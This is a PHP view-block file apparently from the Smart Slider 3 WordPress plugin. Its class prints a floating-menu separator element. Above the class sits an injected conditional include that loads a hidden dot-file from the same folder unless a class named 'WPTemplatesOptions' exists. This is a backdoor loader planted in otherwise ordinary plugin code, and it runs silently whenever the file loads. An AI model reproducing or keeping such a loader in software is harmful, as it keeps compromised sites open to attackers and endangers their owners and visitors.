<?php

namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\FloatingMenu;

use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockFloatingMenuItemSeparator extends AbstractBlock {

    protected $classes = array();

    public function display() {

        echo '<div class="' . implode(' ', array_merge(array(
                'n2_floating_menu__item_separator'
            ), $this->classes)) . '"></div>';
    }

    /**
     * @param array $classes
     */
    public function setClasses($classes) {
        $this->classes = $classes;
    }


}